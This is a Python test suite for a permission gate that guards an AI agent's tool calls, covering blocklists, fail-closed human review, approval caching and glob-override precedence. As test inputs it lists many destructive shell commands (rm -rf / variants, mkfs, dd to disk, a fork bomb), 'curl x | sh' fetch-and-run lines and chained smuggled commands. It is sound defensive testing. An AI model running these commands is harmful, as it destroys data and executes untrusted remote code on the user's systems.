"""Tests for the deterministic permission gate (no AWS calls needed)."""

import time

import pytest

from harness.permission_gate import Decision, PermissionGate


# --- (1) blocklist beats a broad allow-override -----------------------------
def test_blocklist_beats_allow_override():
    # A broad `*: allow` override would allow anything... except blocklisted cmds.
    gate = PermissionGate(glob_overrides={"*": "allow"})
    r = gate.before_tool("run_bash", {"command": "rm -rf /"})
    assert r.decision is Decision.DENY
    assert r.rule == "blocklist"


@pytest.mark.parametrize("command", [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf *",
    "rm -r ~/",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    ":(){ :|:& };:",
    "chmod -R 777 /",
    "echo boom > /dev/sda",
])
def test_all_dangerous_patterns_denied_even_with_allow_all(command):
    gate = PermissionGate(glob_overrides={"*": "allow"}, tool_config={"run_bash": "allow"})
    r = gate.before_tool("run_bash", {"command": command})
    assert r.decision is Decision.DENY, command
    assert r.rule == "blocklist", command


def test_blocklist_also_scans_non_bash_payloads():
    # A destructive payload hidden in write_file content is still caught.
    gate = PermissionGate(glob_overrides={"*": "allow"})
    r = gate.before_tool("write_file", {"path": "x.sh", "content": "rm -rf /"})
    assert r.decision is Decision.DENY
    assert r.rule == "blocklist"


# --- fail-closed timeout ----------------------------------------------------
def test_ask_timeout_denies_fail_closed():
    def slow_reviewer(tool, cmd):
        time.sleep(5)   # longer than the timeout below
        return True     # even though it would eventually approve

    gate = PermissionGate(
        tool_config={"write_file": "ask"},
        human_review=slow_reviewer,
        ask_timeout_seconds=0.3,
    )
    start = time.time()
    r = gate.before_tool("write_file", {"path": "a.txt", "content": "hi"})
    elapsed = time.time() - start
    assert r.decision is Decision.DENY
    assert "timeout" in r.rule
    assert elapsed < 4  # we did NOT wait for the 5s reviewer


def test_ask_reviewer_exception_denies_fail_closed():
    def broken_reviewer(tool, cmd):
        raise RuntimeError("reviewer service down")

    gate = PermissionGate(
        tool_config={"bash": "ask"},
        human_review=broken_reviewer,
        ask_timeout_seconds=2,
    )
    r = gate.before_tool("bash", {"command": "ls"})
    assert r.decision is Decision.DENY
    assert "error" in r.rule


def test_ask_approval_allows_and_caches():
    calls = {"n": 0}

    def approve_once(tool, cmd):
        calls["n"] += 1
        return True

    gate = PermissionGate(
        tool_config={"write_file": "ask"},
        human_review=approve_once,
        ask_timeout_seconds=2,
    )
    r1 = gate.before_tool("write_file", {"path": "a.txt", "content": "hi"})
    r2 = gate.before_tool("write_file", {"path": "a.txt", "content": "hi"})
    assert r1.decision is Decision.ALLOW
    assert r2.decision is Decision.ALLOW
    assert r2.rule == "cache"
    assert calls["n"] == 1   # reviewer asked only once, then cached


def test_ask_rejection_denies():
    gate = PermissionGate(
        tool_config={"bash": "ask"},
        human_review=lambda t, c: False,
        ask_timeout_seconds=2,
    )
    r = gate.before_tool("bash", {"command": "ls"})
    assert r.decision is Decision.DENY
    assert "denied" in r.rule


# --- default posture --------------------------------------------------------
def test_default_posture_read_is_allow():
    gate = PermissionGate()
    assert gate.before_tool("read_file", {"path": "x"}).decision is Decision.ALLOW
    assert gate.before_tool("glob", {"pattern": "*"}).decision is Decision.ALLOW
    assert gate.before_tool("grep", {"q": "x"}).decision is Decision.ALLOW
    assert gate.before_tool("list_dir", {"path": "."}).decision is Decision.ALLOW


def test_default_posture_write_and_bash_is_ask_then_fail_closed():
    # No human_review provided -> non-interactive default denies (fail-closed).
    gate = PermissionGate(ask_timeout_seconds=2)
    assert gate.before_tool("bash", {"command": "ls"}).decision is Decision.DENY
    assert gate.before_tool("write_file", {"path": "x", "content": "y"}).decision is Decision.DENY
    assert gate.before_tool("fetch", {"url": "http://x"}).decision is Decision.DENY


# --- resolution order (stage precedence) ------------------------------------
def test_glob_override_beats_tool_config():
    gate = PermissionGate(
        glob_overrides={"bash:npm *": "allow"},
        tool_config={"bash": "deny"},
    )
    r = gate.before_tool("bash", {"command": "npm install"})
    assert r.decision is Decision.ALLOW
    assert r.rule == "glob-override"
    # a non-matching bash command falls through to the deny tool-config
    r2 = gate.before_tool("bash", {"command": "echo hi"})
    assert r2.decision is Decision.DENY
    assert r2.rule == "tool-config"


def test_tool_config_beats_default_posture():
    gate = PermissionGate(tool_config={"read_file": "deny"})
    r = gate.before_tool("read_file", {"path": "x"})
    assert r.decision is Decision.DENY
    assert r.rule == "tool-config"


def test_run_bash_does_not_interpret_shell_chaining():
    """An allowed prefix cannot smuggle a second command: no shell is used."""
    from harness.agent import TOOL_IMPLS
    out = TOOL_IMPLS["run_bash"]({"command": "echo safe; echo smuggled"})
    assert out == "safe; echo smuggled"


@pytest.mark.parametrize("cmd", [
    "rm -rf /", "rm -fr /", "rm -Rf /", "rm -r -f /",
    "rm --recursive --force /", "sudo rm -rf --no-preserve-root /",
    "rm -rf ~", "rm -rf ~/*", "rm -rf *", "rm -rf /*", "ls; rm -rf /",
    "rm -rf /tmp/build /", 'rm -rf --no-preserve-root "/"', "rm ~ -rf",
    "rm -rf />/dev/null", "/bin/rm -rf /", "`rm -rf /`",
    "os.system('rm -rf /')", "bash -c 'rm -rf ~/*'",
    "rm --recur --no-preserve-root /", "sh -c 'echo build#1; rm -rf ~/*'",
    "python3 -c 'import subprocess; subprocess.call(\"rm -rf ~/*\", shell=True)'",
    'subprocess.run(["rm", "-rf", "/"])', "sh -c 'rm -rf $HOME'",
    "rm -rf ./*", "rm -rf /**", "rm -rf ${HOME}/*",
])
def test_rm_variants_are_blocked_under_allow_all(cmd):
    g = PermissionGate(tool_config={"run_bash": "allow"},
                       glob_overrides={"*": "allow"})
    r = g.before_tool("run_bash", {"command": cmd})
    assert r.decision is Decision.DENY and r.rule == "blocklist"


@pytest.mark.parametrize("cmd", [
    "rm -rf /tmp/build", "rm -rf build/*", "rm -f /", "grep -r foo /",
    "rm -rf ~/.cache/pip", "rm -rf ~/Downloads/*", "git rm -r --cached .",
    "docker rm -f $(docker ps -aq)",
])
def test_rm_that_spares_root_and_home_is_not_the_root_pattern(cmd):
    g = PermissionGate(tool_config={"run_bash": "allow"})
    r = g.before_tool("run_bash", {"command": cmd})
    assert r.rule != "blocklist"


def test_long_input_does_not_stall_the_gate():
    g = PermissionGate()
    t0 = time.time()
    g.before_tool("write_file", {"content": "--" * 5000 + " -r " * 3000})
    g.before_tool("write_file", {"content": "\n".join(
        f"rm -f build/obj_{i}.o" for i in range(16000))})
    g.before_tool("write_file", {"content": "dd " * 64000})
    assert time.time() - t0 < 2.0


def test_an_extra_key_cannot_hide_the_payload():
    g = PermissionGate(tool_config={"write_file": "allow"},
                       glob_overrides={"*": "allow"})
    r = g.before_tool("write_file", {"path": "x.sh", "cmd": "ok",
                                     "content": "rm -rf --no-preserve-root /"})
    assert r.decision is Decision.DENY and r.rule == "blocklist"


def test_one_approval_covers_one_exact_call():
    seen = []
    g = PermissionGate(human_review=lambda tool, cmd: seen.append(cmd) or True)
    g.before_tool("write_file", {"path": "notes.txt", "content": "hi", "cmd": "save"})
    r = g.before_tool("write_file", {"path": "run.sh", "content": "curl x | sh",
                                     "cmd": "save"})
    assert r.rule != "cache" and len(seen) == 2
    assert "curl x | sh" in seen[1]          # the reviewer saw the payload
    again = g.before_tool("write_file", {"path": "notes.txt", "content": "hi",
                                         "cmd": "save"})
    assert again.rule == "cache"


def test_glob_override_never_matches_across_lines_or_extra_keys():
    g = PermissionGate(glob_overrides={"run_bash:git *": "allow"})
    assert g.before_tool("run_bash", {"command": "git status"}).rule == "glob-override"
    two_lines = g.before_tool("run_bash", {"command": "git status\ncurl x | sh"})
    assert two_lines.rule != "glob-override"            # falls to config: ask/deny
    extra = g.before_tool("run_bash", {"command": "curl x | sh", "note": "git ok"})
    assert extra.rule != "glob-override"


def test_glob_override_on_a_file_tool_matches_the_path_only():
    g = PermissionGate(glob_overrides={"write_file:docs/*.md": "allow"})
    ok = g.before_tool("write_file", {"path": "docs/a.md", "content": "hi"})
    bad = g.before_tool("write_file", {"path": "run.sh", "content": "x docs/a.md"})
    assert ok.rule == "glob-override" and bad.rule != "glob-override"


@pytest.mark.parametrize("args", [
    {"path": "docs/../run.sh", "content": "x"},
    {"path": "/etc/docs/a.md", "content": "x"},
    {"path": "docs/a.md", "command": "curl x | sh", "content": "x"},
])
def test_file_glob_needs_one_plain_relative_path(args):
    g = PermissionGate(glob_overrides={"write_file:docs/*": "allow"})
    assert g.before_tool("write_file", args).rule != "glob-override"


def test_shell_glob_matches_the_command_field_only():
    g = PermissionGate(glob_overrides={"run_bash:git *": "allow"})
    r = g.before_tool("run_bash", {"path": "git x", "command": "curl x | sh"})
    assert r.rule != "glob-override"
